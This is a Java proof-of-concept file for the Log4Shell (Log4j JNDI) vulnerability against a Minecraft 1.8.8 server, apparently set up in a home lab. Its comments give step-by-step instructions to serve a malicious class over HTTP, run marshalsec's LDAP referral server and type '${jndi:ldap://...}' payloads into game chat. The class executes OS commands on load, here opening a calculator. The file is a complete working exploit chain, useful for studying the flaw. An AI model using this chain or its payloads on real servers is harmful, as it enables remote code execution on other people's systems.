// ==========================
// SETTING UP ENVIRONMENT
// Download java 8u181 		
// 		https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html
//		https://archive.org/download/Java-Archive/Java%20SE%208%20%288u202%20and%20earlier%29/8u181/JDK/
// Download minecraft server 1.8.8
//		https://mcversions.net/download/1.8.8
// Install MC 1.8.8
// 		Minecraft Launcher > Installations > New Installation 
// ==========================
// RUNNING EXPLOIT	
// Run minecraft server using java 8:
// 		java8 -Xms2G -Xmx2G -jar minecraft_server.1.8.8.jar
// Compile Exploit using:
// 		javac8 MinecraftLog4J.java
// Start an HTTP server on current folder to serve the exploit's .class file.
// 		python3 -m http.server 8000 
// Clone the LDAP server code using
// 		git clone https://github.com/mbechler/marshalsec
// Run the LDAPRefServer  using 
// 		java8 -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:8000/#MinecraftLog4J 1389
// 		java8 -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://IP_ADDRESS:8000/#MinecraftLog4J 1389
// Type on Minecraft Chat:
// 		${jndi:ldap://IP_ADDRESS:1389/MinecraftLog4J}
// 		${jndi:ldap://localhost:1389/MinecraftLog4J}
// 		${jndi:ldap://host.docker.internal:1389/MinecraftLog4J}


// macbook laptop: 192.168.86.46:25565
// windows 10.0.0.3

public class MinecraftLog4J{
	
	static {
		try{ // exploit consists of opening the calculator program
			String os = System.getProperty("os.name").toLowerCase();
			System.out.println("!!HACKED!! (OS = " + os + " )");
	        if (os.contains("win")) {
	            Runtime.getRuntime().exec("calc").waitFor();
	        } else if (os.contains("mac")) {
	            Runtime.getRuntime().exec("open -a Calculator").waitFor();
	        } 
		}catch(Exception ex){
    		System.err.println(ex);
    	}
	}

	// static {
	// 	try{ // exploit consists of opening the calculator program
	// 		String os = System.getProperty("os.name").toLowerCase();
	// 		System.out.println("!!HACKED!! (OS = " + os + " )");
	//         Runtime.getRuntime().exec("ls -1").waitFor(); 
	// 	}catch(Exception ex){
    // 		System.err.println(ex);
    // 	}
	// }

	// public static void main (String args[]){
	// 	String os = System.getProperty("os.name").toLowerCase();
	// 	System.out.println(os);
	// }
}